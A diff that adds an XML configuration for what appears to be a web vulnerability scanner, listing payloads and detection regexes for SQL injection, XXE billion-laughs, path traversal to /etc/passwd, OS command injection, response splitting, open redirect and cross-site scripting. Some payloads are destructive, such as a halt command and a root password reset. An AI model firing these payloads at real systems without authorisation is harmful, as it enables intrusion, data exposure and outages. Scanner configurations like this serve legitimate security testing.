@@ -1,0 +1,96 @@
+<Options>
+  <CustomTests>
+    <CustomTest>Single quote	SQL Injection	$original;EXEC xp_cmdshell 'calc'	(DB|SQL|Database)\s*\w{0,20}\s*(Error|Exception|syntax)</CustomTest>
+    <CustomTest>XXE DoS - Billion Laughs (URL)	XML External Entity	%3C%3Fxml%20version%3D%221.0%22%3F%3E%20%3C!DOCTYPE%20lolz%20%5B%20%20%3C!ENTITY%20lol%20%22lollollollollollollollollollollollollollollollollollollollollollollol%22%3E%20%20%3C!ELEMENT%20lolz%20(%23PCDATA)%3E%20%20%3C!ENTITY%20lol1%20%22%26lol%3B%26lol...	$timeout</CustomTest>
+    <CustomTest>XXE DoS - Billion Laughs (Base 64 + URL)	XML External Entity	PD94bWwgdmVyc2lvbj0iMS4wIj8%2BIDwhRE9DVFlQRSBsb2x6IFsgIDwhRU5USVRZIGxvbCAibG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sIj4gIDwhRUxFTUVOVCBsb2x6ICgjUENEQVRBKT4gIDwhRU5USVRZIGxvbDEgIiZsb2w7JmxvbDsmbG9sOyZsb2...	$timeout</CustomTest>
+    <CustomTest>XXE DoS - Billion Laughs (Base 64)	XML External Entity	PD94bWwgdmVyc2lvbj0iMS4wIj8+IDwhRE9DVFlQRSBsb2x6IFsgIDwhRU5USVRZIGxvbCAibG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sbG9sIj4gIDwhRUxFTUVOVCBsb2x6ICgjUENEQVRBKT4gIDwhRU5USVRZIGxvbDEgIiZsb2w7JmxvbDsmbG9sOyZsb2w7...	$timeout</CustomTest>
+    <CustomTest>XXE DoS - Billion Laughs	XML External Entity	&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE lolz [
+ &lt;!ENTITY lol "lollollollollollollollollollollollollollollollollollollollollollollol"&gt;
+ &lt;!ELEMENT lolz (#PCDATA)&gt;
+ &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+ &lt;!ENTITY lol2 "&amp;lol1;&amp;lo...	$timeout</CustomTest>
+    <CustomTest>TautologyLimitVariantNoEncoding	SQL Injection	$original+0,$original+1,$original-1	$verify_tautology</CustomTest>
+    <CustomTest>TautologyWithNoQuotes	SQL Injection	$original or 1=1,$original and 1=0,$original or 3=3	$verify_tautology</CustomTest>
+    <CustomTest>PostGresMakeFileNoEncoding	SQL Injection	$original; copy (select 'gotcha') to '/tmp/$entity_id' --	</CustomTest>
+    <CustomTest>TautologyWithSingleQuotes	SQL Injection	$original' or '1'='1,$original' and 'A'='0,$original' or 'A'='A	$verify_tautology</CustomTest>
+    <CustomTest>PostGresMakeFile	SQL Injection	$original%3b%20copy%20(select%20%27gotcha%27)%20to%20%27%2ftmp%2f$entity_id%27%20--	</CustomTest>
+    <CustomTest>TautologyLimitVariant	SQL Injection	$original%2b0,$original%2b1,$original-1	$verify_tautology</CustomTest>
+    <CustomTest>TautologySQLError	SQL Injection	$original'--1,$original',$original'--2	$verify_tautology</CustomTest>
+    <CustomTest>TautologyEncodedwithnoQuotes	SQL Injection	$original+or+1%3d1,$original+and+1%3d0,$original+or+3%3d3	$verify_tautology</CustomTest>
+    <CustomTest>TautologyEncodedwithSingleQuotes	SQL Injection	$original'+or+'1'%3d'1,$original'+and+'A'%3d'0,$original'+or+'A'%3d'A	$verify_tautology</CustomTest>
+    <CustomTest>Percent sign SQL variant	SQL Injection	%	(DB|SQL|Database)\s*\w{0,20}\s*(Error|Exception|syntax)</CustomTest>
+    <CustomTest>Single quote2	SQL Injection	'	(DB|SQL|Database)\s*\w{0,20}\s*(Error|Exception|syntax)</CustomTest>
+    <CustomTest>Open Redirect No scheme	Spoofing through URL Redirection	//evil.bad/	Location:[^/]*//evil.bad/</CustomTest>
+    <CustomTest>RelianceUserAdminUser	Reliance on Untrusted Inputs in a Security Decision	user,admin,user	$verify_tautology</CustomTest>
+    <CustomTest>RelianceYesNoYes	Reliance on Untrusted Inputs in a Security Decision	yes,no,yes	$verify_tautology</CustomTest>
+    <CustomTest>Reliance101	Reliance on Untrusted Inputs in a Security Decision	1,0,1	$verify_tautology</CustomTest>
+    <CustomTest>RelianceTrueFalseTrue	Reliance on Untrusted Inputs in a Security Decision	true,false,true	$verify_tautology</CustomTest>
+    <CustomTest>checkForParameterValueFileNameUse	Path Traversal	$original,$original/test,./$original	$verify_tautology</CustomTest>
+    <CustomTest>PathTraversalAllEncoded	Path Traversal	%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%65%74%63%2F%70%61%73%73%77%64	$body=root\:x</CustomTest>
+    <CustomTest>PathTraversalDoubleEncodedWin	Path Traversal	..%255..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini%2500.txt	$body=; for 16-bit app support</CustomTest>
+    <CustomTest>PathTraversalDoubleEncoded	Path Traversal	..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd	$body=root\:x</CustomTest>
+    <CustomTest>Windows Unencoded	Path Traversal	..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini	$body=; for 16-bit app support</CustomTest>
+    <CustomTest>Linux Unencoded	Path Traversal	../../../../../../../../../../../../../../../../etc/passwd	$body=root\:x</CustomTest>
+    <CustomTest>Path Traversal No Null Windows	Path Traversal	..%5..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini	$body=; for 16-bit app support</CustomTest>
+    <CustomTest>Path Traversal No Null	Path Traversal	..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd	$body=root\:x</CustomTest>
+    <CustomTest>Url Encoded Windows	Path Traversal	..%5..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00.txt	$body=; for 16-bit app support</CustomTest>
+    <CustomTest>Url Encoded Linux	Path Traversal	..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.txt	$body=root\:x</CustomTest>
+    <CustomTest>PowerShellCallLocaalhostNoQuoteEchoJSONEscaped	OS Command Injection	&amp;powershell \"[System.Net.WebRequest]\:\:Create('http\://127.0.0.1\:9999/$entity_id').GetResponse()\";&amp;echo 	</CustomTest>
+    <CustomTest>WindowsCallLocaalhostQuoteEchoJSONEscaped	OS Command Injection	\"&amp;start iexplore http\://127.0.0.1\:9999/$entity_id &amp; echo \"	</CustomTest>
+    <CustomTest>PowerShellCallLocalhostNoQuoteEchoBlackOps	OS Command Injection	$original&amp;powershell "[System.Net.WebRequest]::Create('http://127.0.0.1:9999/$entity_id').GetResponse()";&amp;echo 	</CustomTest>
+    <CustomTest>PowerShellCallLocalhostQuoteEchoBlackOps	OS Command Injection	"&amp;powershell "[System.Net.WebRequest]::Create('http://127.0.0.1:9999/$entity_id').GetResponse()";&amp;echo "	</CustomTest>
+    <CustomTest>WindowsCallLocalhostNoQuoteEchoBlackOps	OS Command Injection	$original&amp;start iexplore http://127.0.0.1:9999/$entity_id &amp; echo 	</CustomTest>
+    <CustomTest>WindowsCallLocalhostQuoteEchoBlackOpsPipe	OS Command Injection	"|start iexplore http://127.0.0.1:9999/$entity_id | echo "	</CustomTest>
+    <CustomTest>WindowsCallLocalhostQuoteEchoBlackOps	OS Command Injection	$original"&amp;start iexplore http://127.0.0.1:9999/$entity_id &amp; echo "	</CustomTest>
+    <CustomTest>OSCommandInjectionTautologyNoQuotes	OS Command Injection	$original;echo 1;,$original;bla bla,$original;echo 1;echo 2;	$verify_tautology</CustomTest>
+    <CustomTest>ddquotes	OS Command Injection	$original';dd;echo '	$timeout</CustomTest>
+    <CustomTest>Linux echo unencoded quotes	OS Command Injection	$original';echo VUL`echo N3`RABLE;echo '	VULN3RABLE</CustomTest>
+    <CustomTest>Linux echo unencoded no quotes	OS Command Injection	$original;echo VUL`echo N3`RABLE;	VULN3RABLE</CustomTest>
+    <CustomTest>TautologyCommandInjectionSingleQuotes	OS Command Injection	$original'|echo ',$original',$original'|echo ''|echo '	$verify_tautology</CustomTest>
+    <CustomTest>OSCommandDD	OS Command Injection	$original`dd`	$timeout</CustomTest>
+    <CustomTest>Linux echo encoded	OS Command Injection	;echo+VUL`echo+N3`RABLE;	VULN3RABLE</CustomTest>
+    <CustomTest>Powershell Encoded	OS Command Injection	"%26powershell+"[Environment]::OSVersion";	Microsoft</CustomTest>
+    <CustomTest>Powershell	OS Command Injection	"&amp;powershell "[Environment]::OSVersion";	Microsoft</CustomTest>
+    <CustomTest>OSI Windows	OS Command Injection	&amp;vol	Volume.in.drive</CustomTest>
+    <CustomTest>OSI Linux	OS Command Injection	`id`	uid=</CustomTest>
+    <CustomTest>OSi - Ruby Specific encoded	OS Command Injection	$original[inline]=%3C%=`id`%%3E	uid=</CustomTest>
+    <CustomTest>OSi - Ruby Specific	OS Command Injection	$original[inline]="&lt;%=`id`%&gt;"	uid=</CustomTest>
+    <CustomTest>halt	OS Command Injection	`halt`	</CustomTest>
+    <CustomTest>reset root password	OS Command Injection	`echo -e "Welcome1\nWelcome1" | passwd root`	</CustomTest>
+    <CustomTest>mkdir ticks	OS Command Injection	`mkdir EHT$entity_id`	</CustomTest>
+    <CustomTest>HttpResponseSplittingNoEncoding	HTTP Response Splitting	$original
+BlackOps:Bla
+	$header=[\r\n]BlackOps:\s?Bla[\r\n]</CustomTest>
+    <CustomTest>HTTPResponseSplittingJSONEncoded	HTTP Response Splitting	$original\r\nBlackOps:Bla\r\n	$header=[\r\n]BlackOps:\s?Bla[\r\n]</CustomTest>
+    <CustomTest>HTTPResponseSplittingUrlEncoded	HTTP Response Splitting	$original%0D%0ABlackOps:Bla%0D%0A	$header=[\r\n]BlackOps:\s?Bla[\r\n]</CustomTest>
+    <CustomTest>ImageDoubleEncoded	Cross-Site Scripting	$original%253e%253cimg%2520src%3d%2500%2520onerror%253dalert(__dynamic_value__ticks__)%253e	&lt;img src=[^&gt;]+ onerror=alert\([\d]+\)&gt;</CustomTest>
+    <CustomTest>ClickOnMap	Cross-Site Scripting	%3cmap%20name%3dx%3e%3carea%20shape%3d%22rect%22%20coords%3d%220%2c0%2c1000%2c1000%22%20href%3d%22data%3ax%2c%25%203%20c%20script%20%25%203%20ealert(document.domain)%25%203%20c%20%2fscript%20%25%203%20e%22%3e%3c%2fmap%3e%3cimg%20src%3d%22x%22%20usemap%...	&lt;map name=x&gt;&lt;area shape="rect" coords="0,0,1000,1000" href="data:x,% 3 c script % 3 ealert\(document.domain\)% 3 c /script % 3 e"&gt;&lt;/map&gt;&lt;img src="x" usemap="#x" height="1000" width="1000"&gt;</CustomTest>
+    <CustomTest>Space After Function Name - DoubleQuote	Cross-Site Scripting	blah%40host.local%22%2balert%20(1)%2b%22	$body=blah@host.local"\+alert \(1\)\+"</CustomTest>
+    <CustomTest>Space After Function Name Unencoded - DoubleQuote	Cross-Site Scripting	blah@host.local"+alert (1)+"	$body=blah@host.local"\+alert \(1\)\+"</CustomTest>
+    <CustomTest>Space After Function Name Unencoded	Cross-Site Scripting	blah@host.local'+alert (1)+'	$body=blah@host.local'\+alert \(1\)\+'</CustomTest>
+    <CustomTest>Space After Function Name	Cross-Site Scripting	blah%40host.local%27%2balert%20(1)%2b%27	$body=blah@host.local'\+alert \(1\)\+'</CustomTest>
+    <CustomTest>inline js double quote	Cross-Site Scripting	"; alert(__dynamic_value__ticks__);//	$body="; alert\([\d]+\);//</CustomTest>
+    <CustomTest>inline js single quote	Cross-Site Scripting	'; alert(__dynamic_value__ticks__);//	$body='; alert\([\d]+\);//</CustomTest>
+    <CustomTest>IMG without quotes	Cross-Site Scripting	$original&gt;&lt;img src=bla onerror=alert(__dynamic_value__ticks__)&gt;	$body=&lt;img src=[^&gt;]+ onerror=alert\([\d]+\)&gt;</CustomTest>
+    <CustomTest>input autofocus	Cross-Site Scripting	&lt;input autofocus onfocus='alert(__dynamic_value__ticks__)'	$body=&lt;input autofocus onfocus='alert\([\d]+\)'</CustomTest>
+    <CustomTest>Javascript Context No Quotes	Cross-Site Scripting	;prompt(_dynamic_ticks);	$body=&lt;script[^&gt;]+&gt;[^&gt;]*prompt(\d+);</CustomTest>
+    <CustomTest>STYLE No Quotes	Cross-Site Scripting	/&gt;&lt;style onload=prompt(__dynamic_value__ticks__)&gt;	$body=/&gt;&lt;style onload=prompt\(\d+\)&gt;</CustomTest>
+    <CustomTest>IMG onerror	Cross-Site Scripting	'"/&gt;&lt;img src="x" onerror="prompt('$entity_id')"&gt;	$body=&lt;img src="x" onerror="prompt\('[^']+'\)"&gt;</CustomTest>
+  </CustomTests>
+  <TestOnlyParameters>True</TestOnlyParameters>
+  <PatternOfTestRequest>
+  </PatternOfTestRequest>
+  <AttackTargetList>
+  </AttackTargetList>
+  <AutoRunTests>True</AutoRunTests>
+  <LoginBeforeTests>False</LoginBeforeTests>
+  <NumberOfThreads>10</NumberOfThreads>
+  <PatternEntityExclusion>
+  </PatternEntityExclusion>
+  <PatternRequestExclusion>
+  </PatternRequestExclusion>
+  <PatternOfFirstRequestToTest>
+  </PatternOfFirstRequestToTest>
+  <GenerateAllEncodings>True</GenerateAllEncodings>
+</Options>
